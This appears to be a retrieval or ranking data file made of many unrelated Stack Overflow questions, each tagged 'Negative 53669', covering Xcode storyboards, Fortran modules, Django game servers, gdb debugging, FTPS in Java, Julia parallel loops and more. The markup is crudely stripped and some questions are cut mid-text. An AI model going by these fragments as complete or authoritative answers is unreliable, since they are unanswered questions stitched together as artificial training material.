various other standard classes  Is it safe to assume that deletion of the parent object will always be sufficient to fully destruct an object I try to pick my words carefully here I know there are cases where it is desirable to not free the memory pointed to by an object, but that is beyond the scope of this questionp

Negative 53669 pIm trying to get to grips with XCode5, but most code samples are preXCode5. and of course pre iOS7. The main issue is Storyboards. LOTS of people want to know how to build in SCode5 without Storyboards  but I want to know how to move prestoryboard code to storyboard code.p  pFor Example. The most excellent book, Geolocation in iOS Alasdair Allan, OReilly, 2012, is full of code written a few releases ago. Of course as I am coming into XCode at XCode5iOS7 level, I have no idea what they are talking about in various parts.  I kind of have the beginning of the sample code working but its throwing an erro now and I cant figure it out. I suspect because its trying to do it Code4 way, and Im in XCode5.p  pAnyway  what would be nice is a tutorial that points out what one changes.

Negative 53669 pIm a bit confused about the use of an interface block inside a module and the use of the CONTAINS statement to create an explicit interface for a procedure inside a module.p  pI usually write a procedure using an interface block inside a module. For example,p  precode    MODULE ModExample     INTERFACE          SUBROUTINE Sumatorya, b, c             IMPLICIT NONE              INTEGER, INTENTINa             INTEGER, INTENTOUTb             INTEGER, INTENTOUTc         END SUBROUTINE Sumatory     END INTERFACE     END MODULE ModExample     SUBROUTINE Sumatorya, b, c       IMPLICIT NONE        INTEGER, INTENTINa       INTEGER, INTENTOUTb       INTEGER, INTENTOUTc        Executable statements here     END SUBROUTINE Sumatory codepre  pAnd this works for me. But it can also be written using the CONTAINS stament inside the module, and actually this is the way in which example procedures are written in the Fortran books that Ive consulted.p  precodeMODULE ModExample  CONTAINS  SUBROUTINE Sumatorya, b, c     IMPLICIT NONE      INTEGER, INTENTINa     INTEGER, INTENTOUTb     INTEGER, INTENTOUTc      Executable statements here  END SUBROUTINE Sumatory END MODOULE ModExample codepre  pSo what is wrong with the INTERFCE block Are both equivalent constructs Which of the two aproaches should I use Maybe all this questions can be answered with a big it depends but I would like you to give an explanation about their differences. Thanks in advance.p

Negative 53669 pHello Stackoverflowers,p  pWere developing an online boardgame think online monopoly site using Python for the backend. p  pWe use Django for the non realtime stuff authenticating, player profiles, ranking.... The chat server is implemented using socket.io and Tornodo. The game server part is what caused us problems.p  pWe currently that could change also use Tornado and socket.io, each Tornado instance is located at a gameX.site.com address on a maybe different server and host several games simultaneously much like a chat server in fact, except that messages would not go to all users but only to the ones involved in the same game.p  pWhat cause us trouble is how to we update the Django instance game log, score, and so on as games progress. Also wed like to use Django for authentication as each player would ask the Django server to join the game and be given a disposable idpassword couple just for it. Obviously we would have to communicate those to the game server in some way.p  pAt first the chosen solution was to use something like Redis as a bidirectional message queue, Django would post ispassword to Redis and the Tornado would then querying Redis on incoming connection. Also a Django cron would run every minute or so to deal with the waiting message. But we fear that frequently and possibly long running cron would impede the main site since the PostgreSQL database is hosted on the same server as Django and some Game server may also run on the same machine.p  pWe could alternatively wait for a player to request a ranking updated to process the past games results but we fear such an indefinite delay will skew the overall ranking and experience and would possibly cause data loss.p  pWe could use CeleryRabbitMQ to update the Main database using Django ORM out of the Tornado processes, but would it be possible to use the same solution to communicate the temporary idpassword to the game server  It doesnt look like you can post a message to Celery and retrieve it on an other side.p  pThank for your insight.p

Negative 53669 pI am working with fragments and nesting fragments within fragments using the support library. p  pI have a scenario where I add a new fragment which contains an EditText from within the existing fragment.

Negative 53669 pIm currently playing a trading card game called Hearthstone which is made by blizzard. The game is pretty good, but lacks basic features that any game that calls itself competitive should have, like stat tracking and replay. So as I said in the title, Im trying to create a very crude and poorly done script that lets me record every match I play. Due to my lack of programming skills, 80 of the script is just a bunch of code that I borrowed from all sorts of places and adapted to make it do what I wanted.  strongThe idea is to make it work like thisstrongp  ol lipI take a picture of every turn I play.

Negative 53669 pAt the moment Im using Visual Studio 2012 Professional with Python Tools to program application for my Raspberry Pi. For the moment this is a brilliant combination, because the application can also run on a Windows computer and debug it while in development. After Im at a point that the application can run on my Pi then I will move the files to the Pi and run it there.p  pAlthough today I received a GPIO cable and this open new possibilities to use buttons and controle lightswitches, thus fun stuff. But Now the problem, on my Windows machine I can use the GPIO library and not see the results of the application, what happens if I push this button, what happens in the code, I really want to debug this and also when using in a bigger application. Everytime moving the files to the Pi and testing them there is not a option.p  pIs there a application that can simulate the GPIO interface of the Pi on my Windows machine so I can testdebug the application while developingp

I still need to find a way to achieve that, I do know that there is another parameter tq which allows to select columns but that statement requires the letter notation such as A,B,AA, Id like to use column names instead.p  pMost important I need to get rid of the 500 Internal Server Error. Since it sounds like a Timeout problem Id like to increase that value to a resonable amount of time. My users can wait for a few seconds also because it seems completely random. When it works it loads the page in around 23 seconds. When it doesnt work however I get a 500 Internal Server Error which is going to be really frustrating for the enduser.p  pAny idea I couldnt find anything on the App Engine settings. The only idea I had so far is to split the spreadsheet in multiple spreadsheets or worksheets in order to read less columns.

I started in Labview but found that a linear programming scheme would be better. Python is a lot better for for programming instruments PyVISA, but as a newbie I found GUI development to be a huge pain in Python. Labview is very messy, but the GUI is super simple to make, so I turned back to Labview.  I wrote a working program with Tkinter with hand coding, but GUI handcoding gets confusing and lengthy a bit disorderly.p  pThe visual GUI designers for Python make you define your program functions after you compile a GUI. That is no good. strongI want to put my custom functions eg reading a value from an instrument in at the same time I put my buttons and entry fields, etc.strong I tried Qtdesigner and that requires me to first make my GUI and then code my program by dissecting its code, rightp  pThis how I would like my process flow in python to gop  ol liDesign a file with functionsli liMake a GUI using a visual designer and link the functions from my program in the visual GUI environmentli liCompile GUI file to python fileli liSlap my GUI python file and function file together and I am done.li ol  pI want to know if python gui design via visual gui creators require you to modify the output of the creator with the main program fucntions, or if the gui can be called and then its functionality modified by the main script.

Negative 53669 pIs it possible to adjust the maximum alpha opacity in a codeCATransitioncode for when the views fade in and outp  pWhat I want is something that looks like a modal segue. Compared to a default modal segue, the transition given by codeCATransitioncode is very dramatic. p  pSay I have two views. A the view I want to transition from. B the view I want to transition to.p  pI want B to come moving in from the bottom over A. For this I use the codekCATransitionMoveIncode type, with subtype codekCATransitionFromTopcode which is weird because B is moving up from bottom, not top.p  pIn the default modal segue, this works fine, and A is only greyed out a little. With codeCATransitioncode, A is totally black at towards the end of the transition when B has moved about 70 over A.p  pCodep  precodeUIStoryboard loginBoard  [UIStoryboard storyboardWithNameLogin bundlenil] UIViewController vc  [loginBoard instantiateInitialViewController]  UIWindow keyWindow  [[[UIApplication sharedApplication] delegate] window]  [keyWindow insertSubviewvc.view belowSubviewkeyWindow.rootViewController.view]  CATransition transition  [CATransition animation] transition.duration  0.5 transition.type  kCATransitionMoveIn transition.subtype  kCATransitionFromTop  [keyWindow.layer addAnimationtransition forKeykCATransition]  [keyWindow.rootViewController.view removeFromSuperview] keyWindow.rootViewController  vc codepre  pThe problem originates from a hrefhttpstackoverflow.comquestions22576535movetoanotherstoryboardwithoutauinavigationcontrollerherea.p

I really dont need Firefox to render the page visually and other workings.

Negative 53669 pI have my existing website with a basic users table and all that. I was wondering if you have any idea about a forum I could install which will be of good quality but I can use the current members in my database on it.p  pIt would also help if there was a simple or not too hard way for transferring the current users to the forum users database.p  pWhat I was thinking was when the users registers on the main site heshe also gets added to the forum users database. I use double md5 hash so I need to make sure I can change the forum hash easily for the login page.p  pA simple or easy to follow method is preferred.p  pThanks for your help.p

I can manually retrieve each of the edges manually by iterating over them for each of the vertices, but I want a list returned that contains only the edges between other nodes returned in the list y. p  pIn particular, I need to be able to recreate the subgraph returned within a data structure locally, so gremlin is being used to return that information. Other details about my use case that influence these needs are the fact that manually iterating over each of the nodes edges is too slow, since the rexster server Im running my bulbs script against has to push the data over the wire, and also because if I dont have the set of edges between each of the vertices that were originally returned using the script, then I have to check each vertice encountered along each edge to make sure that its within the set originally returned very nonideal.p  pBasically, any result should be such that, when I look at any of the returned vertices I can know what vertices are linked within the returned setwithout having to do any manual checking or lookups. It should merely be in the dataset.p  pstrongEDIT 1strongp  pI found that gremlins tree pipeline capability was really good for doing exactly what I wanted The problem is, now that I use tree, I need to return it to a form that can be used... I can only return either vertexes or edges, so I cant return tree straight away.p  pstrongEDIT 2strongp  pespeed is right I should use bothE to start with. But I have some conditions that I want to satisfy... I almost had it earlier, but I couldnt get the filter to work correctly.p  precodevert.asl. bothE.gather.scatter.asedge.bothV.or   .hastime.filter it.getPropertytime.toInteger gt startTime.toInteger ,   .hasisRead, .hasisWrite. dedup.storeresults.asvertice.backedge.storeresults.backvertice .looplc lt limit.toInteger.iterate codepre  pI dont understand why I cant use two backs in one pipeline I get a NullPointerException with this one. The basic problem I want solved is do a breadth first search, storing only the nodes that satisfy all of the or above, and store the edges between all vertices that pass the test.p

If I type any text into the field, the list of pets gets narrowed down.  This is all great.  My problem, is that the search results arent sorted in relation to how similar they are to the text that was entered.p  pstrongFor examplestrongp  pThere are a total of 8 pets in the list, sorted by codenamecode using the codeorderBynamecode filter on the lists codengrepeatcode directive.  If I type just the character codeTcode into the input, I get only 5 remaining results.  But the pet at the top of the list is blackie because blackie is the first pet in the list that has a codetcode in it, because blackies codetypecode is cat, which contains a codetcode.p  pimg srchttpi.stack.imgur.comQSraD.png altSample search resultsp  pWhat I would like to see is a way to sort the remaining results by their similarity to the search text.  So, in the example above, instead of seeing blackie at the top of the list, I would see tom which is at the bottom of the filtered list because toms name actually starts with the letter codetcode, which is what I started searching for and is more likely to be what I am trying to find.p  pAny ideas on how to implement this sort of search algorithm  I havent been able to find anything in all of my googling and all of my attempts to write such an algorithm.p  pThanks in advance for the ideas p

Negative 53669 pThis might be a dumb question, however, I have been continually frustrated by what seems to be a big gap in every explanation Ive seen of protocols like XMPP or HTML. So basically, when Ive read documentation on either, in general, it will describe the structure of the data sent back and forth through the protocol, but it does not explain exactly how this data is transferred. Its one thing to provide an example of, say, a generic HTTP request, but it is something else to explain how this text is actually sent to the server. p  pI guess posed another way, what resources are there out there for learning best practices for implementing textbased protocols At their core, are all textbased protocols basically the exact same thing How, for example, would it differ at the binary level, were I to say send the text content of an HTTP request over IRC vs however it is done natively by HTTPp  pIf I wanted to develop my own, simple textual protocol, what would be the best way to send the text to a client Does the content itself even really matter What I mean is that, obviously, HTTP and XMPP are rather different protocols, but do they differ in terms of how the text is transferred between computer to computerp

Negative 53669 pI have a Activity and a Service.  I am using bindService to get the Binder object which gives my activity access to the service.  So I am able to execute commands on the service easily.  What I need is a way to have the service communicate back to the activity.  Is the best way to handle this to make calls directly from my activity to the service via the service instance returned from the binder.  Then use a local broadcast receiver to send messages back from the service to the activityp  pThanks, Nathanp

Negative 53669 pTLDR How do I automatically add a watch in gdb when a function is called so I can debug some memory corruptionp  pI am currently dealing with some memory corruption in C I am mostly seeing 45 types of reaccuring crashes  all of which make little to no sense, so Im guessing it has to be related to memory corruption.p  pThese crashes only happen on the production server, round about every 25hours. Most of them consist of accessing or passing a null pointer where it cant possibly have existed in the first place. One of these places is a lambda capturing this. see belowp  pObviously looked at core dumps and even had gdb attached while it crashed valgrind Ive spent hours staring at multiple instances of valgrind with no success. Enabled gccs stack protection fstackprotectorall I have tried looking over the code amp the changes, but it has been impossible for me to find anything 100k lines of code total, On master, 10,437 files have changed and there have been 3,352,600 additions and 85,495 deletions. since the last release on the production server. I might have just plain missed something, or not looked in the right spots  I cant tell. Used cppcheck to see if there was something plain obvious wrong with the codep  pIf there is an easiermore straight forward method to finding where the corruption occurs feel free to suggest that too.p  pLets look at some simplified code. I have a class, Socket, which manages a client connection. It is constructed something like thisp  precodeListenerOnAcceptfd     Socket s  new Socket     if sgtSetupfd          push into a vector and do some other things       codepre  pSocketSetup calls virtual OnConnect of the Socket class, which then creates a ping event, using a lambdap  precodeSocketOnConnect     mpingEvent  new Event[this]Event e         if thisgtGotPong              close connection         else             thisgtPing              , 30 seconds, true  loop   codepre  pEvent accepts an stdfunction as the callback mpingEvent is deleted in the destructor if set which will cancel the event if it is running.p  pWhat happens rarely is that the lambda calls Ping on a nullptr, which calls mpingPacketSend on this0x1f8, which leads to a segfault.p  pMy question  or rather my proposed solution  would be watching the captured this pointer for writing, which definitely shouldnt happen. There is only one small issue with that..p  pHow would I even watch such a high ammount of pointers without manually adding each one about 400 concurrent connections with a lot disconnectsp  pAs for the captured data I found this is in the closure objectp  precodegdb frame 2 2  0x081b9d63 in operator e0x9b2a748, closure0xb5a8318 at netsocketClient.cpp151 151     netsocketClient.cpp No such file or directory. gdb ptype closure type  const struct      netsocketClient  const this   const codepre  psWhich I can get when creating the lambda easily by just moving the lambda to auto callback   which will be of typep  precodegdb info locals callback  this  0xb4dd0948 gdb ptype callback type  struct      netsocketClient  const this  gdb print callback 1  this  0xb4dd0948 codepre  pThis is gcc version 4.7.2 Debian 4.7.25 for reference, might be different with other compilersversionss Shortly before posting I realized the struct would probably change address once moved into the stdfunction is this correct Ive been digging through the gnu functional header, but I havent really been able to find anything yet, Ill keep looking and updating thisp  pAnother note I am posting this full describtion with all of the details included in case anyone has an easier solution for me.

Negative 53669 pwe recently switched to strongGunicornstrong using the stronggeventstrong worker.p  pOn our website, we have a few tasks that take a while to do. Longer than 30 seconds.p  h2Preambleh2  pemWe did the whole celery thing already, but these tasks are run so rarely that its just not feasible to keep celery and redis running all the time. We just do not want that. We also do not want to start celery and redis on demand. We want to get rid of it. Im sorry for this, but I want to prevent answers that go like Why dont you use celery, its greatemp  h2The tasks we want to run asynchronouslyh2  pIm talking about tasks that perform 3000 SQL queries inserts that have to be performed one after each other. emThis is not done all too oftenem. We limited to running only 2 of these tasks at once as well. They should take like strong23 minutesstrong.p  h2The approachh2  pNow, what we are doing now is taking advantage of the gevent worker and codegevent.spawncode the task and return the response.p  h2The problemh2  pI found that the spawned threads are actually blocking. As soon as the response is returned, the task starts running and no other requests get processed until the task stops running. The task will be killed after 30s, the gunicorn codetimeoutcode. In order to prevent that, I use codetime.sleepcode after every other SQL query, so the server gets a chance to respond to requests, but I dont feel like this is the point.p  h2The setuph2  pWe run gunicorn, django and use gevent. The behaviour described occurs in my dev environment and using 1 gevent worker. In production, we will also run only 1 worker for now. Also, running 2 workers did not seem to help in serving more requests while a task was blocking. p  h2TLDRh2  ul liWe consider it feasible to use a gevent thread for our 2 minute task over celery li liWe use gunicorn with gevent and wonder why a thread spawned with gevent.spawn is blockingli liIs the blocking intended or is our setup wrongli ul  pThank youp

Negative 53669 pSo heres the gist Ive got a program that has a large image composed of many little images and it takes this image and separates it into many smaller images like frames for a film that the user can then go and scrub through.p  pI currently use this methodp  precode NSMutableArray createArrayFromImage NSData largerImageData      UIImage largerImage  [UIImage imageWithData largerImageData]     int arraySize  intlargerImage.size.heightlargerImage.size.width Find out how many images there are     NSMutableArray imageArray  [[NSMutableArray alloc] init]     for int i  0 i lt arraySize i           CGRect cropRect  CGRectMake0, largerImage.size.width  i, largerImage.size.width, largerImage.size.width         CGImageRef imageRef  CGImageCreateWithImageInRect[largerImage CGImage], cropRect         UIImage image  [UIImage imageWithCGImage imageRef]         CGImageReleaseimageRef          [imageArray addObject UIImageJPEGRepresentationimage, 1.0]         NSLogAdded image d, i           NSLogFinal size d, int[imageArray count]     return imageArray  codepre  pHowever this is extremely slow due to codeUIImageJPEGRepresentationcode being called and is much faster if I just add the codeUIImagecode directly into the array however when I do this when the user scrubs through the images from the array it starts allocating huge amounts of memory forcing the app to eventually crash. It calls code[UIImageView setImage]code if that helps. Any assistance with this would be extremely appreciated.p  pEDT CGImageCreateWithImageInRect might keep the largerImage which causes it to take up so much memoryp

Negative 53669 pI have recently taken to programming in Java with LWJGL. I have been following a tutorial series on how to make a game engine using this library. However, I have been getting a lot of errors despite the fact that I copied his code exactly, and later used the exact code he typed to troubleshoot. I asked him about it and he said that it was probably because my OpenGl was out of date. Sure enough, when I checked, I discovered that I was running OpenGL 2.1, and needed at least openGl 3.0 to follow his tutorial. When I searched around on how to update my drivers, it said that you needed update your OS X. However, I am currently running the latest version of Mavericks, and have a 2012 retina Macbook Pro. According to this apple help page a hrefhttpsupport.apple.comkbHT5942viewlocaleenUSamplocaleenUS relnofollowhttpsupport.apple.comkbHT5942viewlocaleenUSamplocaleenUSap  pmy particular model should be running OpenGL 4.1, not 2.1.

Negative 53669 pIm trying to setup a continuous integration flow for a group of several Rails service apps I have that communicate with each other through endpoints.

Restore the stack  p  pI dont have problems with the stack, but I do have some problems with my registers backup I cannot backup registers without modifying some of them I can NOT use the stack because I cannot backup the stack this way p  pIt is possible for me to backup them on the heap I use a structure with some .EAX , .EBX and so on members, I acces that structure from ASM and here is the problem... I have to modify some registers to be able to do thisp  pHowever, this is my story. What I really want to understand is the answer to the following questionp  pIs there any rule about the registers that can be modified and the registers that are NOT modified during a function callp  pI checked with a debugger some function calls. I add a breakpoint at call SomeFunction, press F8 to step over function call and check the modified registers. I can see something like this 1. ESPEBP may be modified depending on calling convention cdecl vs stdcall 2. EAX, EBX, EDX  are almost always modified 3. EBX, EDI, ESI seems to be ALWAYS preservedp  pSo here comes my pseudosolution is is ok if I preserve only those registers EBX, EDI, ESI I dont mess up the stack so EBP and ESP are not a problem. But I have to modify some registers EAX, ECX, EDX.p  pWill I have any problems with some compiler optimizations Is it possible to mess up the code by modifying those innocent registers EAX, ECX, EDXp  pThank youp
Negative 53669 pIve inherited a legacy .Net 3.5 VB app to support from a client and theyd like to make some small data changes. Before we begin I think its important to note that I am running Windows 7 64 bit, and VS 2013 Ultimate R2. p  pWhile making my first changes to the project, I noticed their datasets use a custom tool AGDataSetGenerator written by Shawn Wildermuth in 2004. I did a lot of poking around on how to register custom tools. I went over to a hrefhttpwww.codeproject.comArticles8582InheritfromADONETDataSettocreateyourownbu relnofollowhttpwww.codeproject.comArticles8582InheritfromADONETDataSettocreateyourownbua and got the source code of the tool, inside the project there are a couple of utility files that you need to run in order to register the tool. Remember this was made in 2004 so things were a little different back then. p  pI modified the Reg.cmd file to point to v2.0.50727 since my project is running .Net 3.5 and  .Net 3.0 and 3.5 are both just minor updates from .Net 2.0 and not completely new .net versions. Also I noticed that there is both a Framework and a Framework64 folder with the CWindowsMicrosoft.Net folder, so I added both locations to my .cmd file in hopes to cover all of my bases. Code Belowp  pstrongReg.cmd  Originalstrongp  precodeCWINDOWSMicrosoft.NETFrameworkv1.1.4322regasm codebase verbose FAGDataSetGenerator.dll codepre  pstrongReg.cmd  My Modified Versionstrong p  precodeCWINDOWSMicrosoft.NETFrameworkv2.0.50727regasm codebase verbose FAGDataSetGenerator.dll CWINDOWSMicrosoft.NETFramework64v2.0.50727regasm codebase verbose FAGDataSetGenerator.dll codepre  pemThen it was on to the.reg file.emp  pUpon opening the file my first thought was, cool, I can just switch the version from 7.1 to 12.0 and away we go. Not the case. After quite a bit of googling I found the first line registers the tool for VB.Net, and the second registry entry registers the tool for C, so for me I only need the first line, also VS now a days registers to a new location codeHKEYLOCALMACHINESoftwareWow6432NodeMicrosoftVisualStudiocode for 64 bit specific registers. So in hopes to cover my bases once again, I tried including both 32 bit and 64 bit locations. I even threw in a more global register for both 32 and 64 bit that in hopes that would point visual studio to the generator entry, unfortunately Im a bit out of my wheelhouse here so I was pretty much grabbing at straws.p  pstrongBSDataSetGenerators.reg  Originalstrongp  precodeWindows Registry Editor Version 5.00  [HKEYLOCALMACHINESOFTWAREMicrosoftVisualStudio7.1Generators164B10B9B20011D08C6100A0C91E29D5AGDataSetGenerator] ADOGuy DataSet Generator CLSID87BF1B1CE1DF4f24A07E2BD9B8CAD316 GeneratesDesignTimeSourcedword00000001  [HKEYLOCALMACHINESOFTWAREMicrosoftVisualStudio7.1GeneratorsFAE04EC1301F11d3BF4B00C04F79EFBCAGDataSetGenerator] ADOGuy DataSet Generator CLSID3C13044D394D45cd89FF51C885BFBCD9 GeneratesDesignTimeSourcedword00000001 codepre  pstrongBSDataSetGenerators.reg  My Modified Versionstrongp  precodeWindows Registry Editor Version 5.00  [HKEYLOCALMACHINESoftwareMicrosoftVisualStudio12.0CLSID87BF1B1CE1DF4f24A07E2BD9B8CAD316] AGDataSetGenerator InprocServer32CWINDOWSsystem32mscoree.dll ClassBottomLine.Generators.VBNETAGDataSetGenerator AssemblyAGDataSetGenerator, Version1.0.0.0, Cultureneutral, PublicKeyToken35e4ca7ea38d2508 ThreadingModelBoth  [HKEYLOCALMACHINESoftwareWow6432NodeMicrosoftVisualStudio12.0CLSID87BF1B1CE1DF4f24A07E2BD9B8CAD316] AGDataSetGenerator InprocServer32CWINDOWSsystem32mscoree.dll ClassBottomLine.Generators.VBNETAGDataSetGenerator AssemblyAGDataSetGenerator, Version1.0.0.0, Cultureneutral, PublicKeyToken35e4ca7ea38d2508 ThreadingModelBoth  [HKEYLOCALMACHINESoftwareMicrosoftVisualStudio12.0Generators164B10B9B20011D08C6100A0C91E29D5AGDataSetGenerator] AGDataSetGenerator CLSID87BF1B1CE1DF4f24A07E2BD9B8CAD316 GeneratesDesignTimeSourcedword00000001  [HKEYLOCALMACHINESOFTWAREWow6432NodeMicrosoftVisualStudio12.0Generators164B10B9B20011D08C6100A0C91E29D5AGDataSetGenerator] AGDataSetGenerator CLSID87BF1B1CE1DF4f24A07E2BD9B8CAD316 GeneratesDesignTimeSourcedword00000001 codepre  pRegardless of everything Ive tried.

Negative 53669 pI have quite a large solution with many parts of our project in it. When Im working on a single part I really dont need the other parts loaded into memory, much less taking up code analysis resources or accidentally getting built if I hit build all.p  pAs such, Ive decided to create a new subsolution which contains the subset of projects Im working with dependencies and such for a specific product Im working on. It happens to be a Universal Windows Phone 8.1 application which has a shared project with our Universal Windows 8.1.p  pSo far, Ive created a new empty solution and added all of the dependencies necessary to it. It builds just fine. The problem Im running into is that I cant seem to add the shared project to the solution.p  pI.e., if our projects are codeExample.WinRTcode, codeExample.WinRT.Phonecode, and codeExample.WinRT.Sharedcode, then I can add .WinRT and .WinRT.Phone just fine, and they build, but I cannot add .WinRT.Shared. This is obviously a problem because there are files in the shared project that I need to be editing.p  pHow can I add both projects to the new solutionp
Negative 53669 pLets say we have an codeOrdercode entity that will be modeled in 2 diff. BCs in a ecommerce application. p  pThe first BC is codeOrder Placementcode. This BC takes care of collecting all orders placed by our customers from our different websites, validates them and populates its corresponding database by Orders with state either codePlacedcode or codeRejectedcode.p  pThe 2nd BC is codeShipmentcode. This allows the employees in the warehouses to mark an Order as codeShippedcode in its database once it leaves the warehouse.p  pNow since both BCs use different databases which are empty at first, there will be a need to inform the codeShipmentcode BC of the orders that were codePlacedcode, so that when a scanner wants to codeShipcode an codeOrdercode it will be there in the codeShipmentcode BC.p  pMy initial approach was to create a domain event once an codeOrdercode is placed in the codeOrder placementcode BC and have the codeShipmentcode BC subscribe to that event and create a corresponding codeOrdercode entity in its database for every order placed.p  pHowever, I cant stop that feeling that Im duplicating data across different databases. p  pMy second approach is to ask the codeOrder Placementcode each time an order is being codeShippedcode for an codeOrdercode entity, but I still need to maintain the state of the Order in case a failure of a failure in the shipment.p  pIs there a better approach to all this from a DDD POVp

Negative 53669 pIm creating a class to use in Coldfusion to replace the cfftp tag so I can do FTP over SSL.  I have a custom tag that interacts with the class, using either FTPClient or FTPSClient.  Connecting, logging in, putting a file, changing directories, listing files all work, but I cannot get a file for the life of me.  I have tried both the retrieveFile and retrieveFileStream methods and neither works.  Below is my getFile method implemented with retrieveFileStream and the inputstream is always null, no matter what.  The file is there and the permissions are good.  I just have no idea at this point.  I can connect and get the file through WSFTP without a problem, so I think its something in my implementation.

Negative 53669 pIs it possible to have an OS environment variable define a macro for use in C code in VS2013p  pFor example, I would like to possibly have the environment variable codeDEVLOGDIRECTORYcode set, and perform the following in my C source filep  precodeifdef DEVLOGDIRECTORY     loggingsetdirDEVLOGDIRECTORY endif codepre  pI would like to keep the actual value, and whether the macro is defined or not, emoutem of the Visual Studio project file, so that different developers can set this how they feel and not be affected by other developers preference. Everything Ive found says to specify this in the project options, but that wont work in this case.p  pIf there is a better way to accomplish my goal, Im open to alternativesp

Negative 53669 pI am aware that you can manually stop VBA code execution by CTRL  BREAK which will stop the code no matter how deep into the call stack you are, and that you could also programmatically codeexit functioncode  codeexit subcode if you were only 1 layer into the call stack, but how could I combine these two approaches to programmatically stop a running program no matter how deep into the call stack it is  This would be sort of similar to the effects of an error, but I would like to do this in a controlled manner so I can run some clean up code before leaving the program.p  pFor example,p  precodesub c     msgbox stop here     exit sub               this will only exit sub c end sub  sub b     call c     msgbox c complete    msgbox will still show, since exit sub in c did not end the program end sub  sub a     call b     msgbox b complete end sub codepre  pIs not working because codeexit subcode is only stopping codeccode.  I suppose I could turn these all into functions and implement return codes so I could string together a bunch of if statements with codeexit functioncode in them if the return codes indicate the function was exited early, but is there a simpler way to do thisp
Negative 53669 pI am developing a embree based raytracer currently very early in development. If you are not familiar with embree you can read more at their webpage.p  pThe issue Currently if you start the renderer to use 1 ray per pixel and per iterationreferred to 1 ray mode from now on, it renderers just fine. If you set it trace 4 rays in a packetraypacket4 it renders the mesh fine, util you move some distace away from it, then some black lines appear.p  pa hrefhttpimgur.comaQ12IZ relnofollowIssue Screenshotsa Screenshot camera parameters are  all in ray packet modep  blockquote   ol   liposition 0, 1, 0, rotation 20, 0, 0li   liposition 0, 38, 0 rotation 90, 0, 0li   liposition 9.5, 5, 0 rotation 90, 0, 0li   liposition 9.5, 38, 0 rotation 90, 0, 0li   ol blockquote  pInvestigation showed that the lines appear only in pakcet mode and when some distance away from mesh. I am posting screens of the issue rendered images in several different camera positions. Here is the source code of the projectin github a hrefhttpsgithub.comAlexanderMladenovEmbreeRTtreemastersrc relnofollowSource Codeap  pMy bet is that the problem is in either the packet generation found at camera.cppGetRayPacket4 or in the rendering renderer.hRenderBuffer4, Raytrace4. Switching between the modes is done in main.cpp by just replacing RenderToBuffer4 wtih RenderToBuffer and RTCINTERSECT4 to RTCINTERSECT1.p  pAny help or ideas are much appreciated. p  pEditp  pI apologize for the lack of config files, or scene files, it is currently in very early dev stage 2 days spent and everything is hardcoded for testing at the moment.p  pEdit 2p  pI have discovered that removid the  i in the ray direction calculation in GetRayPacket4, removes the issue, but then the 4 packed rays are identical. Why would that fix it p
Negative 53669 pI have 40 triangular Melspaced filterbank vectors with 257 element each.p  pI want to multiply them with my power spectrum generated using FFT of 20ms audio frame result and then sum the results so I can get melspaced power spectrum.p  pThe problem though is having 257 value where most of the values are zero is kind of overkill. Simply, I can only store nonzero elements instead of the whole 257 value, but I think there is a smarter way to apply multiple filterbanks, probably using matrix multiplication. Is my reasoning correct If yes how is it donep

Negative 53669 pSo Im drawing something in core graphics that I want to rotate when the user presses a button. In my storyboard I have a View and a button.

Negative 53669 pIm building a dashboard using d3js that shows a graph on the primary SVG. However, when there is no data, I would like the SVG to not exist since it just looks like a ton of empty white space.p  pRather than just appending and removing the SVG as needed, I would like to do this with some type of smooth animationtransition so that the sudden creation of the large DOM element doesnt jar the user or seem like a giant flicker. p  pMy understanding of a hrefhttpbost.ocks.orgmiketransition relnofollowd3 transitionsa is that they can be used to remove DOM elements, but not to create them. Is this correct An idea I had was that maybe I could use d3 transitions to update the size of the SVG, but Im not sure if thats the best way to go. The attributes not being CSS also removes the possibility of using a hrefhttpapi.jquery.comanimate relnofollowjQuery animatea I think. If d3 cant do it, what other technologies exist to allow me to achieve the desired affect jQuery fadeIn is not what Im looking for since it would still instantly create the SVG in the entire space.p
Negative 53669 pSince Android 4.4 KitKat its possible to use function getExternalFilesDirs. I implemented this function and it works fine. The Google reference says the following about this functionp  pemReturns absolute paths to applicationspecific directories on all external storage devices where the application can place persistent files it owns. These files are internal to the application, and not typically visible to the user as media.em p  pThe first returned result is the primary storage which you also get when you call function getExternalFilesDir.p  pIn my opinion, you can get only one additional storage device, namely when the user inserted a micro sdcard in his device. Thats why I name the first returned result Internal storage, the second I name SDcard. Are there cases where there are more than 2 returned results possible with getExternalFilesDirsp

Negative 53669 pIm trying to parallelize a little scientific code I wrote.  But when I add codeparallelizecode, similar code on just one processor suddenly takes 10 times as long to execute.  It should take roughly the same amount of time.  The first code makes one memory allocation, while the second makes 20.  But codezerosFloat64, numbinscode should not be a bottleneck.  codenumbinscode is 1800.  So each call to codezeroscode should be allocating 81800 bytes.  20 calls to allocate 14,400 bytes should not be taking this long.p  pI cant figure out what Im doing wrong, and the Julia documentation is vague and nonspecific about how variables are accessed within codeparallelcode.  Both versions of the code below compute the correct value for the coderdfcode vector.  Can anyone tell by looking at it what is making it allocate so much memory and take so longp  precodeatoms  readAtomsfile  rdf  zerosFloat64, numbins time for k  120     for i  1numatoms         for j  1numatoms             r  distancek, atoms, i, atoms, j              binnumber  floorr  dr  1             rdf[binnumber]  1         end     end end codepre  pelapsed time 8.1 seconds 0 bytes allocatedp  precodeatoms  readAtomsfile  time rdf  parallel  for k  120     rdfpart  zerosFloat64, numbins      for i  1numatoms         for j  1numatoms             r  distancek, atoms, i, atoms, j              binnumber  floorr  dr  1             rdfpart[binnumber]  1         end     end      rdfpart end codepre  pelapsed time 81.2 seconds 33472513332 bytes allocated, 17.40 gc timep

For example, the user can say they have 40 students, but only want to enter in grades for 5 of them. p  pWhen I entered in the break statement, the mean average, median, and modemost occurring element are not displaying the right numbers. How can I make it so that the break statement doesnt break the rest of the programp  pI understand that it can be done with a for loop, but the use of a while loop is a requirement in the program.p

